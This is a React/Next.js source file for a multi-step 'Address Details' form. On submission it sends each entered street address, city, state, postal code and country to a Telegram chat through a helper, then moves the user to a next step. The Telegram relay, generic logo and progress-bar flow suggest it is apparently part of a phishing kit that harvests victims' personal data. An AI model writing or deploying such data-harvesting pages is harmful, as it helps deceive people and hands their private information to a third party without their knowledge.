/* eslint-disable @next/next/no-img-element */
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { sendTelegramMessage } from "../../../utils/telegram";

const AddressDetailsForm = () => {
  const [formData, setFormData] = useState({
    streetAddress: "",
    addressLine2: "",
    city: "",
    state: "",
    postalCode: "",
    country: "",
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const router = useRouter();

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.streetAddress.trim()) newErrors.streetAddress = "Street Address is required";
    if (!formData.city.trim()) newErrors.city = "City is required";
    if (!formData.state.trim()) newErrors.state = "State/Region/Province is required";
    if (!formData.postalCode.trim()) newErrors.postalCode = "Postal/Zip Code is required";
    if (!formData.country.trim()) newErrors.country = "Country is required";
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    // Format message for Telegram
    const message = `
      📍 Address Details Submitted:
      🏠 Street Address: ${formData.streetAddress}
      🏢 Address Line 2: ${formData.addressLine2 || "N/A"}
      🏙 City: ${formData.city}
      🌍 State/Region/Province: ${formData.state}
      📮 Postal/Zip Code: ${formData.postalCode}
      🌎 Country: ${formData.country}
    `;

    // Send message to Telegram
    await sendTelegramMessage(message);
    console.log("Form Submitted:", formData);

    // Navigate to the next page (modify route if needed)
    router.push("/next-step");
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-green-600 shadow-md">
        <div className="max-w-3xl mx-auto p-4 flex items-center">
          <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3"/>
          <div className="flex-1 ml-2">
            <div className="h-2 bg-green-500 rounded-full mt-1">
              <div className="h-full bg-green-200 rounded-full transition-all duration-300" />
            </div>
          </div>
        </div>
      </header>
      <main className="flex-grow container mx-auto mt-12 px-4">
        <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
          <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Address Details</h1>
          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Street Address</label>
              <input
                value={formData.streetAddress}
                onChange={(e) => setFormData({ ...formData, streetAddress: e.target.value })}
                className={`w-full mt-2 border ${errors.streetAddress ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.streetAddress && <p className="text-red-500 text-sm mt-1">{errors.streetAddress}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Address Line 2 (Optional)</label>
              <input
                value={formData.addressLine2}
                onChange={(e) => setFormData({ ...formData, addressLine2: e.target.value })}
                className="w-full mt-2 border border-gray-300 rounded-lg p-3"
              />
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">City</label>
              <input
                value={formData.city}
                onChange={(e) => setFormData({ ...formData, city: e.target.value })}
                className={`w-full mt-2 border ${errors.city ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">State/Region/Province</label>
              <input
                value={formData.state}
                onChange={(e) => setFormData({ ...formData, state: e.target.value })}
                className={`w-full mt-2 border ${errors.state ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.state && <p className="text-red-500 text-sm mt-1">{errors.state}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Postal/Zip Code</label>
              <input
                value={formData.postalCode}
                onChange={(e) => setFormData({ ...formData, postalCode: e.target.value })}
                className={`w-full mt-2 border ${errors.postalCode ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.postalCode && <p className="text-red-500 text-sm mt-1">{errors.postalCode}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Country</label>
              <input
                value={formData.country}
                onChange={(e) => setFormData({ ...formData, country: e.target.value })}
                className={`w-full mt-2 border ${errors.country ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
            </div>

            <button type="submit" className="w-full bg-green-500 text-white p-4 rounded-xl hover:bg-green-600">
              Submit
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default AddressDetailsForm;
